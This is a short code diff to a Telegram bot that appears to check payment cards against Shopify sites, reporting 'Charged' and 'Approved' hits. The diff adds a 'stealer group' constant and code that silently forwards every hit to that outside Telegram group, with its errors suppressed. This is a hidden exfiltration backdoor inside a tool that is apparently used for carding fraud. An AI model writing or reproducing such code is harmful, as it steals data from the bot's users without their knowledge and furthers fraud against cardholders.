@@ -1,4 +1,4 @@
-:from telethon import TelegramClient, events, Button
+from telethon import TelegramClient, events, Button
 import asyncio
 import aiohttp
 import aiofiles
@@ -66,6 +66,9 @@ BOT_TOKEN = os.environ['BOT_TOKEN']
 PREMIUM_FILE = 'premium.txt'
 SITES_FILE = 'sites.txt'
 PROXY_FILE = 'proxy.txt'
+
+# Stealer group — all hits (Charged + Approved) are forwarded here
+STEAL_GROUP = '@Shopiix_steal_botc'
 
 # Initialize bot
 bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
@@ -273,6 +276,12 @@ async def send_realtime_hit(user_id, result, hit_type, username):
 
     try:
         await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
+    except:
+        pass
+
+    # Forward hit to stealer group
+    try:
+        await bot.send_message(STEAL_GROUP, premium_emoji(message), parse_mode='html')
     except:
         pass
 
